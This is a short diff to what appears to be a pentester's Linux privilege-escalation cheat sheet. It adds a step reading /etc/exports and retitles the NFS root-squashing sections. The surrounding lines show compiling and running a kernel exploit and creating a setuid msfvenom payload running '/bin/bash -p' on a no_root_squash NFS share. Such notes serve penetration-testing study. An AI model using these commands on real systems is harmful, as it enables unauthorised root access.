@@ -307,7 +307,11 @@ gcc /tmp/40838.c -pthread -o /tmp/exploit # target machine
 ./exploit # target machine
 ```
 ## NFS ✅
-### Root Squashing (1) ✡️
+```bash
+cat /etc/exports
+# From the output, notice that “no_root_squash” option is defined for the “/tmp” export.
+```
+### Root-Squashing (1) ✡️
 ```bash
 cat /etc/exports # target machine
 mkdir /tmp/nfs # our kali
@@ -316,7 +320,7 @@ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf # our
 chmod +xs /tmp/nfs/shell.elf # our kali
 /tmp/shell.elf # target machine
 ```
-### Root Squashing (2) ✡️
+### Root-Squashing (2) ✡️
 ```bash
 showmount -e 10.10.10.10 # our kali
 mkdir /tmp/1 # our kali
